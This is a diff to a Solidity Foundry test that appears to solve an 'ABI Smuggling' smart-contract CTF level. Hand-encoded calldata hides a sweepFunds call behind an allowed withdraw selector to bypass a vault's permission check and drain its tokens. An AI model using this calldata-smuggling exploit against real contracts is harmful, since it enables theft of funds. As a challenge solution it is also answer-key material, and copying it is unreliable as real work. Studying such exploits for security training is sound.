@@ -73,7 +73,13 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory data = abi.encodeWithSignature("sweepFunds(address,address)",player,address(token));
+        // bytes memory executeData = abi.encodeWithSignature("execute(address,bytes)",address(vault),data);
+        bytes memory executeData = hex"1cff79cd0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000";
+        // executeData = abi.encodePacked(executeData, bytes4(0xd9caed12));
+        // console.logBytes(executeData);
+        (bool success,) = address(vault).call(executeData);
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
